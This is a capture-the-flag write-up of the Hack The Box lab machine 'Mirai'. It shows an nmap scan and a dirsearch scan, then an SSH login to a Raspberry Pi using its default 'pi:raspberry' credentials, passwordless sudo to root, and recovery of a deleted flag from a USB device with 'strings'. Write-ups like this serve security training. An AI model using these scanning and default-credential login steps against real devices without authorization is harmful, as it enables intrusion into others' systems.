## ---------------->> Mirai <<---------------------

// We start with nmap scan

    $ nmap -sV -A -Pn -T4 10.10.10.48 -p-
-------

    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-08-11 12:32 UTC
    Stats: 0:02:06 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 16.75% done; ETC: 12:45 (0:10:21 remaining)
    Stats: 0:05:48 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
    Connect Scan Timing: About 43.08% done; ETC: 12:46 (0:07:38 remaining)
    Nmap scan report for 10.10.10.48
    Host is up (0.35s latency).
    Not shown: 65529 closed ports
    PORT      STATE SERVICE VERSION
    22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)
    | ssh-hostkey: 
    |   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)
    |   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)
    |   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)
    |_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)
    53/tcp    open  domain  dnsmasq 2.76
    | dns-nsid: 
    |_  bind.version: dnsmasq-2.76
    80/tcp    open  http    lighttpd 1.4.35
    |_http-server-header: lighttpd/1.4.35
    |_http-title: Site doesn't have a title (text/html; charset=UTF-8).
    1417/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
    32400/tcp open  http    Plex Media Server httpd
    | http-auth: 
    | HTTP/1.1 401 Unauthorized\x0D
    |_  Server returned status 401 but no WWW-Authenticate header.
    |_http-cors: HEAD GET POST PUT DELETE OPTIONS
    |_http-favicon: Plex
    |_http-title: Unauthorized
    32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


// Navigating to http://10.10.10.48/ give us blank page

// Lets try to search for interesting directories with [dirsearch](https://github.com/maurosoria/dirsearch)(By Maurosoria)

    $ python3 dirsearch.py -u http://10.10.10.48/ -t 150 -i 100-400
------

      _|. _ _  _  _  _ _|_    v0.4.1
     (_||| _) (/_(_|| (_| )

    Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 150 | Wordlist size: 10903

    Target: http://10.10.10.48/

    [13:19:46] Starting: 
    [13:20:06] 301 -    0B  - /admin  ->  http://10.10.10.48/admin/

    Task Completed

// We found /admin/ directory

// Navigating to http://10.10.10.48/admin/ 

// We see a dashboard of Pi-Hole dns blocklist application for raspberry-pi devices.

![Image 1](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Mirai/1.png)

// Clicking on bottomm 'Login' >> 'Forgot password' , we can see that at first raspberry-pi get default credentials

![Image 2](https://github.com/W0lfySec/HTB-Writeups/blob/main/Images/Mirai/2.png)

// And since we got SSH running lets try to connect with default raspberry-pi credentials: 'pi : raspberry'

    $ ssh pi@10.10.10.48
-------

    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Sun Aug 27 14:47:50 2017 from localhost

    SSH is enabled and the default password for the 'pi' user has not been changed.
    This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


    SSH is enabled and the default password for the 'pi' user has not been changed.
    This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

    pi@raspberrypi:~ $ id
    uid=1000(pi) gid=1000(pi) groups=1000(pi),4(adm),20(dialout),24(cdrom),27(sudo),29(audio),44(video),46(plugdev),60(games),100(users),101(input),108(netdev),117(i2c),998(gpio),999(spi)
    pi@raspberrypi:~ $ 

// We got connected !!

// And user flag !

    pi@raspberrypi:~/Desktop $ cat user.txt
    ff83770..........................



### ------Privilleges Escelation------

// Gain root

    $ sudo -l
    Matching Defaults entries for pi on localhost:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User pi may run the following commands on localhost:
        (ALL : ALL) ALL
        (ALL) NOPASSWD: ALL
    pi@raspberrypi:~/Desktop $ sudo -i

    SSH is enabled and the default password for the 'pi' user has not been changed.
    This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.


    SSH is enabled and the default password for the 'pi' user has not been changed.
    This is a security risk - please login as the 'pi' user and type 'passwd' to set a new password.

    root@raspberrypi:~# 

// Was easy isnt it, we have sudo permissions

// When try to see the flag we got some text in the file instead

    root@raspberrypi:~# cat /root/root.txt 
    I lost my original root.txt! I think I may have a backup on my USB stick...
    
// So the flag is on the USB stick

// Lets run 'df' command to see the all connected file systems

    root@raspberrypi:# df
    Filesystem     1K-blocks    Used Available Use% Mounted on
    aufs             8856504 2834172   5549400  34% /
    tmpfs             102396    4868     97528   5% /run
    /dev/sda1        1354528 1354528         0 100% /lib/live/mount/persistence/sda1
    /dev/loop0       1267456 1267456         0 100% /lib/live/mount/rootfs/filesystem.squashfs
    tmpfs             255988       0    255988   0% /lib/live/mount/overlay
    /dev/sda2        8856504 2834172   5549400  34% /lib/live/mount/persistence/sda2
    devtmpfs           10240       0     10240   0% /dev
    tmpfs             255988       8    255980   1% /dev/shm
    tmpfs               5120       4      5116   1% /run/lock
    tmpfs             255988       0    255988   0% /sys/fs/cgroup
    tmpfs             255988       8    255980   1% /tmp
    /dev/sdb            8887      93      8078   2% /media/usbstick
    tmpfs              51200       0     51200   0% /run/user/999
    tmpfs              51200       0     51200   0% /run/user/1000

// We can see there /media/usbstick

// Lets check what inside

    root@raspberrypi:# ls /media/usbstick/
    damnit.txt  lost+found
    
------

    root@raspberrypi:# cat /media/usbstick/damnit.txt 
    Damnit! Sorry man I accidentally deleted your files off the USB stick.
    Do you know if there is any way to get them back?

    -James
    
// seems that the flag rased by james. lets try to find him with 'strings' command on /dev/sdb

    root@raspberrypi:# strings /dev/sdb
    >r &
    /media/usbstick
    lost+found
    root.txt
    damnit.txt
    >r &
    >r &
    /media/usbstick
    lost+found
    root.txt
    damnit.txt
    >r &
    /media/usbstick
    2]8^
    lost+found
    root.txt
    damnit.txt
    >r &
    3d3e483143.................
    Damnit! Sorry man I accidentally deleted your files off the USB stick.
    Do you know if there is any way to get them back?
    -James

--------

// We found root flag !

    3d3e483143................
